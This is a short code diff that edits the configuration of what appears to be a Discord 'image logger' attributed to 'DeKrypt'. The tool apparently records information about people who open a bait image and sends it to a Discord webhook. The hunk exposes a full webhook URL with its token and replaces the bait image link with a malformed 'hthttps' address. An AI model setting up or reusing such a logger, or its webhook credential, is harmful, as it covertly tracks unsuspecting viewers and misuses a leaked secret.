@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1340752535258140833/DG8eigQofMQNxn_bpqte6qFSrEY9iSjYswFD5MsuwwTm1UIheT5Hyu-d44Ib7SphXAzx",
-    "image": "https://s3.amazonaws.com/gather.fandalism.com/artist-ww-BC0553059E2475F159F0FFF5AE7C2C12.jpg", # You can also have a custom image by using a URL argument
+    "image": "hthttps://raw.githubusercontent.com/authenyoo/nettsnake/master/nettspend.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
